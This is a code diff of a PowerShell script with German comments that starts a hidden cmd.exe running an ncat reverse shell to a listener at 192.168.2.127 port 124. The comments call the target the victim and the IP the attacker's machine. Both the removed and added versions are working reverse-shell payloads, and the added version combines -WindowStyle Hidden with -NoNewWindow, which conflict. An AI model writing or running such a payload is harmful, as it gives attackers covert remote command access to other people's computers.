@@ -1,18 +1,24 @@
-# Dies ist das Skript, das auf dem Opfer ausgeführt wird.
-# Es startet eine CMD-Reverse-Shell im Hintergrund.
+# Dieser PowerShell-Code startet eine CMD-Reverse-Shell.
 
-# Definiere den Befehl, der IM CMD-FENSTER ausgeführt werden soll.
-# Dieser Befehl ist der eigentliche Reverse-Shell-Payload für eine CMD-Shell.
-# WICHTIG: Er ersetzt Ihren ursprünglichen $command, der ConPtyShell enthielt.
-# Dieser Payload setzt voraus, dass 'ncat.exe' auf dem Zielsystem verfügbar ist
-# (z.B. im System-PATH oder Sie legen es selbst ab).
-# Ersetzen Sie '192.168.2.127' durch die IP-Adresse Ihres Listeners und '124' durch den Port.
-$cmd_reverse_shell_payload = "ncat.exe 192.168.2.127 124 -e cmd.exe"
+# Definieren Sie die IP-Adresse und den Port Ihres Listeners.
+# ERSETZEN SIE DIESE DURCH IHRE TATSÄCHLICHEN WERTE!
+$ip = "192.168.2.127"  # Die IP-Adresse Ihres Angreifer-Rechners
+$port = 124          # Der Port, auf dem Ihr Ncat-Listener läuft
 
-# Starte einen neuen CMD-Prozess im versteckten Modus.
-# -WindowStyle Hidden: Sorgt dafür, dass kein sichtbares Fenster angezeigt wird.
-# -ArgumentList: Gibt die Argumente für cmd.exe an.
-#   - "/c": Ist ein CMD-Argument, das bedeutet "führe den folgenden Befehl aus und beende CMD danach".
-#   - $cmd_reverse_shell_payload: Dies ist der Befehl, der in CMD ausgeführt wird,
-#     um die Reverse Shell zu initiieren.
-Start-Process cmd.exe -WindowStyle Hidden -ArgumentList "/c", $cmd_reverse_shell_payload
+# Überprüfen Sie, ob ncat.exe existiert. Wenn nicht, versuchen Sie Fallback oder Fehlermeldung.
+# Dies ist eine einfache Prüfung. Bessere Skripte würden nach verschiedenen Pfaden suchen.
+$ncat_path = "ncat.exe"
+if (-not (Get-Command $ncat_path -ErrorAction SilentlyContinue)) {
+    # Optional: Fügen Sie hier Code ein, um ncat herunterzuladen oder eine Fehlermeldung zu generieren.
+    # Für diese Demonstration gehen wir davon aus, dass ncat.exe vorhanden ist.
+    Write-Host "Ncat.exe wurde nicht gefunden. CMD-Reverse-Shell kann möglicherweise nicht gestartet werden."
+    exit
+}
+
+# Starte eine CMD-Reverse-Shell mit ncat
+# -e cmd.exe leitet die Standard-Ein-/Ausgabe von cmd.exe um.
+$cmd_command = "$ncat_path $ip $port -e cmd.exe"
+
+# Führe den ncat-Befehl über cmd.exe aus, versteckt und nicht interaktiv.
+# Dies startet cmd.exe und lässt es den ncat-Befehl ausführen, der dann die Shell sendet.
+Start-Process cmd.exe -WindowStyle Hidden -ArgumentList "/c", $cmd_command -NoNewWindow
